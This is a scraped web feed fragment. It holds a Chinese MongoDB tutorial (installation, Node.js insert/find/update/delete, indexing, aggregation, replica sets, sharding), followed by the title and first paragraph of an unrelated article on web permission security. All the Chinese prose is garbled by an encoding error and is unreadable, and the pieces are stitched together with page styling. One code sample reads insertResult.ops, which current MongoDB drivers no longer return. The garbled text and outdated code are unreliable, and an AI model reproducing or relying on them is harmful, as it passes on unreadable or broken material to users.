.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MongoDBæ˜¯ä¸€ç§å¼€æºçš„NoSQLæ•°æ®åº“ï¼Œä½¿ç”¨æ–‡æ¡£å‹å­˜å‚¨æ•°æ®æ ¼å¼ï¼ˆç±»ä¼¼äºJSONçš„BSONæ ¼å¼ï¼‰ï¼Œä»¥è§£å†³ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“åœ¨å¤„ç†å¤§æ•°æ®å’Œé«˜å¹¶å‘åœºæ™¯ä¸­çš„å±€é™æ€§ã€‚</p>
<h3 data-id="heading-0">MongoDBçš„ç‰¹ç‚¹</h3>
<ol>
<li><strong>æ–‡æ¡£å­˜å‚¨</strong>ï¼šä½¿ç”¨ç±»ä¼¼JSONçš„BSONæ ¼å¼å­˜å‚¨æ•°æ®ã€‚</li>
<li><strong>çµæ´»çš„æ¨¡å¼</strong>ï¼šæ— éœ€é¢„å®šä¹‰è¡¨ç»“æ„ï¼Œæ”¯æŒåŠ¨æ€æ¨¡å¼ã€‚</li>
<li><strong>é«˜å¯ç”¨æ€§</strong>ï¼šé€šè¿‡å‰¯æœ¬é›†å®ç°æ•°æ®çš„å†—ä½™å’Œè‡ªåŠ¨æ•…éšœæ¢å¤ã€‚</li>
<li><strong>æ°´å¹³æ‰©å±•</strong>ï¼šé€šè¿‡åˆ†ç‰‡æŠ€æœ¯å®ç°æ•°æ®åˆ†å¸ƒåˆ°å¤šä¸ªèŠ‚ç‚¹ã€‚</li>
<li><strong>å¼ºå¤§çš„æŸ¥è¯¢èƒ½åŠ›</strong>ï¼šæ”¯æŒä¸°å¯Œçš„æŸ¥è¯¢è¯­æ³•å’ŒèšåˆåŠŸèƒ½ã€‚</li>
</ol>
<h3 data-id="heading-1">å®‰è£…ä¸é…ç½®</h3>
<h4 data-id="heading-2">1. å®‰è£… MongoDB</h4>
<p>å¯ä»¥é€šè¿‡åŒ…ç®¡ç†å™¨æˆ–è€…ä¸‹è½½å‹ç¼©åŒ…çš„æ–¹å¼å®‰è£…MongoDBã€‚åœ¨Ubuntuä¸Šï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get update
sudo apt-get install -y mongodb
</code></pre>
<h4 data-id="heading-3">2. å¯åŠ¨å’Œåœæ­¢ MongoDB</h4>
<p>å¯åŠ¨MongoDBæœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo service mongodb start
</code></pre>
<p>åœæ­¢MongoDBæœåŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo service mongodb stop
</code></pre>
<h3 data-id="heading-4">åŸºæœ¬æ“ä½œç¤ºä¾‹</h3>
<h4 data-id="heading-5">1. åˆ›å»ºæ•°æ®åº“å’Œé›†åˆ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿æ¥ MongoDB</span>
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">MongoClient</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'mongodb'</span>);
<span class="hljs-keyword">const</span> url = <span class="hljs-string">'mongodb://localhost:27017'</span>;
<span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(url);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Connected to MongoDB"</span>);

        <span class="hljs-keyword">const</span> db = client.<span class="hljs-title function_">db</span>(<span class="hljs-string">'mydatabase'</span>); <span class="hljs-comment">// åˆ›å»ºæˆ–é€‰æ‹©æ•°æ®åº“</span>
        <span class="hljs-keyword">const</span> collection = db.<span class="hljs-title function_">collection</span>(<span class="hljs-string">'users'</span>); <span class="hljs-comment">// åˆ›å»ºæˆ–é€‰æ‹©é›†åˆ</span>

        <span class="hljs-comment">// æ’å…¥æ–‡æ¡£</span>
        <span class="hljs-keyword">const</span> insertResult = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">insertOne</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"John Doe"</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">"john.doe@example.com"</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Inserted document:'</span>, insertResult.<span class="hljs-property">ops</span>[<span class="hljs-number">0</span>]);

        <span class="hljs-comment">// æŸ¥è¯¢æ–‡æ¡£</span>
        <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">findOne</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"John Doe"</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Found document:'</span>, user);

        <span class="hljs-comment">// æ›´æ–°æ–‡æ¡£</span>
        <span class="hljs-keyword">const</span> updateResult = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">updateOne</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"John Doe"</span> }, { <span class="hljs-attr">$set</span>: { <span class="hljs-attr">email</span>: <span class="hljs-string">"john.doe@newdomain.com"</span> } });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Updated document count:'</span>, updateResult.<span class="hljs-property">modifiedCount</span>);

        <span class="hljs-comment">// åˆ é™¤æ–‡æ¡£</span>
        <span class="hljs-keyword">const</span> deleteResult = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">deleteOne</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"John Doe"</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Deleted document count:'</span>, deleteResult.<span class="hljs-property">deletedCount</span>);
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">close</span>();
    }
}

<span class="hljs-title function_">run</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">dir</span>);
</code></pre>
<h4 data-id="heading-6">2. ä½¿ç”¨ç´¢å¼•</h4>
<p>ç´¢å¼•å¯¹äºæé«˜æŸ¥è¯¢æ€§èƒ½éå¸¸é‡è¦ã€‚ä»¥ä¸‹ç¤ºä¾‹å±•ç¤ºå¦‚ä½•åˆ›å»ºç´¢å¼•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createIndex</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { <span class="hljs-title class_">MongoClient</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'mongodb'</span>);
    <span class="hljs-keyword">const</span> url = <span class="hljs-string">'mongodb://localhost:27017'</span>;
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(url);

    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>();
        <span class="hljs-keyword">const</span> db = client.<span class="hljs-title function_">db</span>(<span class="hljs-string">'mydatabase'</span>);
        <span class="hljs-keyword">const</span> collection = db.<span class="hljs-title function_">collection</span>(<span class="hljs-string">'users'</span>);

        <span class="hljs-comment">// åˆ›å»ºç´¢å¼•</span>
        <span class="hljs-keyword">const</span> indexName = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">email</span>: <span class="hljs-number">1</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Created index:'</span>, indexName);

        <span class="hljs-comment">// æŸ¥è¯¢ä½¿ç”¨ç´¢å¼•</span>
        <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">findOne</span>({ <span class="hljs-attr">email</span>: <span class="hljs-string">"john.doe@newdomain.com"</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Found document using index:'</span>, user);
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">close</span>();
    }
}

<span class="hljs-title function_">createIndex</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">dir</span>);
</code></pre>
<h4 data-id="heading-7">3. èšåˆæ“ä½œ</h4>
<p>èšåˆæ“ä½œç”¨äºå¤„ç†æ•°æ®å¹¶è¿”å›è®¡ç®—ç»“æœã€‚ä»¥ä¸‹ç¤ºä¾‹å±•ç¤ºå¦‚ä½•è¿›è¡Œèšåˆæ“ä½œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">aggregationExample</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { <span class="hljs-title class_">MongoClient</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'mongodb'</span>);
    <span class="hljs-keyword">const</span> url = <span class="hljs-string">'mongodb://localhost:27017'</span>;
    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(url);

    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>();
        <span class="hljs-keyword">const</span> db = client.<span class="hljs-title function_">db</span>(<span class="hljs-string">'mydatabase'</span>);
        <span class="hljs-keyword">const</span> collection = db.<span class="hljs-title function_">collection</span>(<span class="hljs-string">'orders'</span>);

        <span class="hljs-comment">// æ’å…¥å¤šä¸ªæ–‡æ¡£</span>
        <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">insertMany</span>([
            { <span class="hljs-attr">product</span>: <span class="hljs-string">"Apple"</span>, <span class="hljs-attr">quantity</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">2.5</span> },
            { <span class="hljs-attr">product</span>: <span class="hljs-string">"Banana"</span>, <span class="hljs-attr">quantity</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">1.2</span> },
            { <span class="hljs-attr">product</span>: <span class="hljs-string">"Orange"</span>, <span class="hljs-attr">quantity</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">3.0</span> }
        ]);

        <span class="hljs-comment">// ä½¿ç”¨èšåˆç®¡é“è®¡ç®—æ€»é”€å”®é¢</span>
        <span class="hljs-keyword">const</span> aggregationPipeline = [
            { <span class="hljs-attr">$group</span>: { <span class="hljs-attr">_id</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">total</span>: { <span class="hljs-attr">$sum</span>: { <span class="hljs-attr">$multiply</span>: [<span class="hljs-string">"$quantity"</span>, <span class="hljs-string">"$price"</span>] } } } }
        ];

        <span class="hljs-keyword">const</span> aggResult = <span class="hljs-keyword">await</span> collection.<span class="hljs-title function_">aggregate</span>(aggregationPipeline).<span class="hljs-title function_">toArray</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Total sales:'</span>, aggResult[<span class="hljs-number">0</span>].<span class="hljs-property">total</span>);
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">close</span>();
    }
}

<span class="hljs-title function_">aggregationExample</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">dir</span>);
</code></pre>
<h3 data-id="heading-8">é«˜çº§åŠŸèƒ½</h3>
<h4 data-id="heading-9">å‰¯æœ¬é›†</h4>
<p>å‰¯æœ¬é›†ï¼ˆReplica Setï¼‰æ˜¯MongoDBé«˜å¯ç”¨æ€§çš„å®ç°æ–¹å¼ã€‚å®ƒç”±ä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼ˆPrimary Nodeï¼‰å’Œå¤šä¸ªä»èŠ‚ç‚¹ï¼ˆSecondary Nodesï¼‰ç»„æˆã€‚</p>
<p>è¦é…ç½®å‰¯æœ¬é›†ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">replication:</span>
  <span class="hljs-attr">replSetName:</span> <span class="hljs-string">"rs0"</span>
</code></pre>
<p>ç„¶åå¯åŠ¨MongoDBå®ä¾‹å¹¶åˆå§‹åŒ–å‰¯æœ¬é›†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">rs.<span class="hljs-title function_">initiate</span>()
</code></pre>
<h4 data-id="heading-10">åˆ†ç‰‡</h4>
<p>åˆ†ç‰‡ï¼ˆShardingï¼‰ç”¨äºå¤„ç†å¤§é‡æ•°æ®ï¼Œå°†æ•°æ®åˆ†å¸ƒåœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šã€‚ä»¥ä¸‹æ˜¯åˆ†ç‰‡çš„åŸºæœ¬æ­¥éª¤ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯ç”¨åˆ†ç‰‡</span>
sh.<span class="hljs-title function_">enableSharding</span>(<span class="hljs-string">"mydatabase"</span>)

<span class="hljs-comment">// ä¸ºé›†åˆè®¾ç½®åˆ†ç‰‡é”®</span>
sh.<span class="hljs-title function_">shardCollection</span>(<span class="hljs-string">"mydatabase.users"</span>, { <span class="hljs-string">"_id"</span>: <span class="hljs-number">1</span> })
</code></pre>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>MongoDBæ˜¯ä¸€ç§çµæ´»ã€å¯æ‰©å±•çš„NoSQLæ•°æ®åº“ï¼Œé€‚ç”¨äºå¤„ç†å¤§è§„æ¨¡æ•°æ®å’Œé«˜å¹¶å‘åº”ç”¨ã€‚é€šè¿‡ä¸°å¯Œçš„APIå’Œå„ç§é«˜çº§ç‰¹æ€§ï¼Œå¦‚å‰¯æœ¬é›†å’Œåˆ†ç‰‡ï¼ŒMongoDBæä¾›äº†å¼ºå¤§çš„æ•°æ®å­˜å‚¨å’Œç®¡ç†èƒ½åŠ›ã€‚ä¸Šè¿°ç¤ºä¾‹å±•ç¤ºäº†MongoDBçš„åŸºæœ¬æ“ä½œã€ç´¢å¼•ä½¿ç”¨ã€èšåˆæ“ä½œä»¥åŠé«˜çº§åŠŸèƒ½çš„é…ç½®ï¼Œæ˜¯ç†è§£å’ŒæŒæ¡MongoDBçš„è‰¯å¥½èµ·ç‚¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Web å®‰å…¨ä¸åç¼–è¯‘æºç ä¸‹çš„æƒé™è®¾è®¡ï¼šæ„ç­‘å‰åç«¯ä¸€è‡´çš„é˜²æŠ¤ä½“ç³»]]></title>    <link>https://juejin.cn/post/7603651855236857865</link>    <guid>https://juejin.cn/post/7603651855236857865</guid>    <pubDate>2026-02-08T06:32:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603651855236857865" data-draft-id="7603674653153771529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Web å®‰å…¨ä¸åç¼–è¯‘æºç ä¸‹çš„æƒé™è®¾è®¡ï¼šæ„ç­‘å‰åç«¯ä¸€è‡´çš„é˜²æŠ¤ä½“ç³»"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨"/> <meta itemprop="datePublished" content="2026-02-08T06:32:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Web å®‰å…¨ä¸åç¼–è¯‘æºç ä¸‹çš„æƒé™è®¾è®¡ï¼šæ„ç­‘å‰åç«¯ä¸€è‡´çš„é˜²æŠ¤ä½“ç³»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T06:32:33.000Z" title="Sun Feb 08 2026 06:32:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ Web åº”ç”¨çš„å®‰å…¨ä½“ç³»ä¸­ï¼Œ<strong>æƒé™æ§åˆ¶</strong> æ˜¯æœ€æ ¸å¿ƒçš„é˜²çº¿ä¹‹ä¸€ã€‚æ— è®ºæ˜¯ä¼ä¸šåå°ã€æ•°æ®é—¨æˆ·è¿˜æ˜¯ SaaS å¹³å°ï¼Œä¸€æ—¦æƒé™è®¾è®¡å‡ºç°æ¼æ´ï¼Œå°±å¯èƒ½å¯¼è‡´æ•°æ®æ³„æ¼ã€è¶Šæƒæ“ä½œç”šè‡³åé—¨åˆ©ç”¨ã€‚</p>
